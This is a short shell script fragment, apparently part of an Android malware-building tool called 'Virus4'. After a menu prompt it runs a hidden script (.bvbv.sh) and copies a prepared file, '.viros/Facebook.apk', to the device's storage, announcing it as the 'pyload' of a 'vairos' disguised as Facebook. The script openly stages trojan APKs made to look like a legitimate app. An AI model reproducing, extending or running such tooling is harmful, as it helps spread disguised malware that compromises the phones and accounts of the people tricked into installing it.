echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
cd $HOME/Virus4
python2 Virus4.py
else
cd $HOME/Virus4
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/Virus4/.viros/Facebook.apk /sdcard/Virus4
echo -e "$green               end the vairos----->(facebook) "
echo ""
echo "      Path of the pyload----->  sdcard/Virus4/facebook.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
cd $HOME/Virus4
python2 Virus4.py
